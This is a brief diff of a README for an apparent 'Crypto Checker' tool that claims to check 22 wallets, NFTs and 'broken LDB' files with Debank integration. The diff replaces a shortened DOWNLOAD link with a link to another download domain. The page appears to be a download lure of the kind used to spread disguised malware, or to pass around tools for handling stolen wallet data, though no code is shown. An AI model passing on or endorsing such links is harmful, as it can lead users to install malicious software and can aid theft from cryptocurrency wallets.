@@ -1,6 +1,6 @@
 # 🚀 Crypto Checker: 22 Wallets, NFT, Check of Broken LDB, Debank Integration 🚀
 
-[DOWNLOAD](https://goo.su/YXlm)
+[DOWNLOAD](https://gitdwnl.com/latest)
 ---
 
 ## 📜 Overview
